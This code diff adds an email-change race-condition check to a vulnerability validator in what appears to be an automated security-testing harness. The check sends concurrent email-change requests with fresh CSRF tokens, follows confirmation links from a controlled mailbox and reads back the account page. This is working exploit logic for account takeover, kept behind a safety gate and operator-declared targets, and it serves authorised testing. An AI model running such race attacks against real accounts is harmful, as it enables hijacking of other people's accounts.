@@ -22,10 +22,13 @@ regardless of the exact wording used.
 
 from __future__ import annotations
 import asyncio
+import html
 import logging
 import re
+import uuid
 from dataclasses import dataclass
 from typing import TYPE_CHECKING, Any
+from urllib.parse import parse_qsl, urlencode, urljoin, urlsplit
 
 import httpx
 
@@ -73,11 +76,17 @@ class RaceConditionValidator(Validator):
     active = True
 
     def __init__(self, timeout: float = 15.0, max_redirects: int = 0,
-                 burst_size: int = _BURST_SIZE, run_context=None):
+                 burst_size: int = _BURST_SIZE, run_context=None,
+                 target_email: str | None = None,
+                 mailbox_url: str | None = None,
+                 email_race_rounds: int = 6):
         self.timeout = timeout
         self.max_redirects = max_redirects
         self.burst_size = burst_size
         self.run_context = run_context
+        self.target_email = target_email
+        self.mailbox_url = mailbox_url
+        self.email_race_rounds = max(1, min(int(email_race_rounds), 12))
         self.user_agent = (
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
@@ -130,6 +139,9 @@ class RaceConditionValidator(Validator):
                             "change to race. This validator only tests mutating methods.",
                     evidence="", raw_output="[]",
                 )
+
+            if self._is_email_race(exchange):
+                return await self._validate_email_race(finding, exchange)
 
             headers = {k: v for k, v in (exchange.request_headers or {}).items()
                        if k.lower() not in ("content-length", "host")}
@@ -242,3 +254,156 @@ class RaceConditionValidator(Validator):
                 finding_class=finding.vulnerability_class, confidence=0.0, confirmed=False,
                 summary=f"Race condition validation failed: {e}", evidence="", raw_output=str(e),
             )
+
+    def _is_email_race(self, exchange: HttpExchange) -> bool:
+        if not (self.target_email and self.mailbox_url and self.run_context):
+            return False
+        if (exchange.method or "GET").upper() not in ("POST", "PUT", "PATCH"):
+            return False
+        return any(k.lower() == "email" for k, _ in parse_qsl(
+            exchange.request_body or "", keep_blank_values=True))
+
+    async def _validate_email_race(self, finding: Finding,
+                                   exchange: HttpExchange) -> ValidationResult:
+        """Prove a single-endpoint email race with an independent readback.
+
+        Two fresh values are submitted concurrently: an operator-declared target
+        address and a controlled address at an operator-declared mailbox.  A
+        confirmation link received by the controlled mailbox is followed, then
+        the authenticated account page is read back.  Confirmation requires that
+        the account contains the *target* address, so ordinary repeatable 200s and
+        an ordinary controlled-address confirmation are both negative controls.
+        """
+        from harness.run_context import TypedRequest
+        from .transport import bind_session
+
+        pairs = parse_qsl(exchange.request_body or "", keep_blank_values=True)
+        if not any(k.lower() == "email" for k, _ in pairs):
+            return ValidationResult(
+                validator=self.get_name(), status="skipped",
+                finding_class=finding.vulnerability_class, confidence=0.0,
+                confirmed=False, summary="No email field was present in the request.",
+                evidence="", raw_output="[]")
+
+        gate = self.run_context.gate
+        decision = gate.authorize_burst(
+            validator_name=self.get_name(), method=exchange.method, url=exchange.url,
+            requested_burst_size=2, body=exchange.request_body)
+        if not decision.allowed or decision.allowed_burst_size < 2:
+            return ValidationResult(
+                validator=self.get_name(), status="blocked",
+                finding_class=finding.vulnerability_class, confidence=0.0,
+                confirmed=False,
+                summary=f"Blocked by safety gate: {decision.reason}",
+                evidence="", raw_output="[]")
+
+        headers = {k: v for k, v in (exchange.request_headers or {}).items()
+                   if k.lower() not in ("content-length", "host")}
+        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
+        session_ref, request_headers = bind_session(self.run_context, headers)
+        executor = self.run_context.executor()
+        mailbox_host = urlsplit(self.mailbox_url).hostname or ""
+        controlled = f"race-{uuid.uuid4().hex[:12]}@{mailbox_host}"
+        account_url = urljoin(exchange.url, "/my-account")
+        seen_links: set[str] = set()
+        sent_pairs = 0
+
+        current_pairs = list(pairs)
+
+        def body_for(email_value: str) -> str:
+            return urlencode([(k, email_value if k.lower() == "email" else v)
+                              for k, v in current_pairs])
+
+        async def send_change(email_value: str):
+            return await executor.execute(
+                TypedRequest(exchange.method, exchange.url,
+                             headers=request_headers, body=body_for(email_value)),
+                capability=self.get_name(), session_ref=session_ref)
+
+        async def fetch(url: str, *, bound: bool = False):
+            return await executor.execute(
+                TypedRequest("GET", url, headers=request_headers if bound else {}),
+                capability=self.get_name(), session_ref=session_ref if bound else None)
+
+        def links_from(base: str, text: str) -> list[str]:
+            decoded = html.unescape(text or "")
+            values = re.findall(r'''(?:href=["']([^"']+)|
+                                     (https?://[^\s<>"']+))''', decoded, re.I | re.X)
+            return [urljoin(base, a or b).rstrip(".,)") for a, b in values]
+
+        for _ in range(self.email_race_rounds):
+            # Stateful feature crawling submitted this form once to capture its
+            # shape, so its anti-CSRF value may already be spent.  Mint a fresh
+            # session-bound form immediately before every pair.
+            form_page = await fetch(account_url, bound=True)
+            if form_page.ok:
+                from harness.feature_workflow import extract_forms
+                wanted_path = urlsplit(exchange.url).path
+                form = next((f for f in extract_forms(form_page.body or "", account_url)
+                             if urlsplit(f.action).path == wanted_path
+                             and f.method.upper() == (exchange.method or "POST").upper()), None)
+                if form is not None:
+                    fresh_pairs = parse_qsl(form.body(), keep_blank_values=True)
+                    if any(k.lower() == "email" for k, _ in fresh_pairs):
+                        current_pairs = fresh_pairs
+            responses = await asyncio.gather(
+                send_change(self.target_email), send_change(controlled),
+                return_exceptions=True)
+            sent_pairs += 1
+            if not any(not isinstance(r, Exception) and getattr(r, "ok", False)
+                       for r in responses):
+                continue
+
+            mailbox = await fetch(self.mailbox_url)
+            if not mailbox.ok:
+                continue
+            pages = [(self.mailbox_url, mailbox.body or "")]
+            for link in links_from(self.mailbox_url, mailbox.body or ""):
+                if urlsplit(link).hostname == mailbox_host and link not in seen_links:
+                    seen_links.add(link)
+                    message = await fetch(link)
+                    if message.ok:
+                        pages.append((link, message.body or ""))
+
+            confirmation_links: list[str] = []
+            app_host = urlsplit(exchange.url).hostname
+            for page_url, text in pages:
+                if controlled.lower() not in text.lower() and page_url != self.mailbox_url:
+                    continue
+                for link in links_from(page_url, text):
+                    if (urlsplit(link).hostname == app_host
+                            and ("confirm" in link.lower()
+                                 or "change-email" in link.lower())):
+                        confirmation_links.append(link)
+
+            for link in confirmation_links:
+                if link in seen_links:
+                    continue
+                seen_links.add(link)
+                await fetch(link, bound=True)
+                readback = await fetch(account_url, bound=True)
+                visible = html.unescape(re.sub(r"<[^>]+>", " ", readback.body or ""))
+                visible = " ".join(visible.lower().split())
+                target_is_current = (
+                    f"your email is: {self.target_email.lower()}" in visible)
+                if readback.ok and target_is_current:
+                    return ValidationResult(
+                        validator=self.get_name(), status="confirmed",
+                        finding_class=finding.vulnerability_class, confidence=0.95,
+                        confirmed=True,
+                        summary=("Concurrent email changes crossed their validation state: "
+                                 "a link delivered to the controlled mailbox changed the "
+                                 "authenticated account to the independently declared target address."),
+                        evidence=(f"Independent account readback contained target address after "
+                                  f"{sent_pairs} bounded request pair(s); mailbox/token values redacted."),
+                        raw_output=str({"pairs": sent_pairs, "readback": True,
+                                        "controlled_mailbox": "[REDACTED]"}))
+
+        return ValidationResult(
+            validator=self.get_name(), status="not_confirmed",
+            finding_class=finding.vulnerability_class, confidence=0.1,
+            confirmed=False,
+            summary=("Bounded concurrent email changes did not produce a controlled-mailbox "
+                     "confirmation whose account readback contained the target address."),
+            evidence=f"Tried {sent_pairs} request pair(s); no target-address readback.",
+            raw_output=str({"pairs": sent_pairs, "readback": False}))
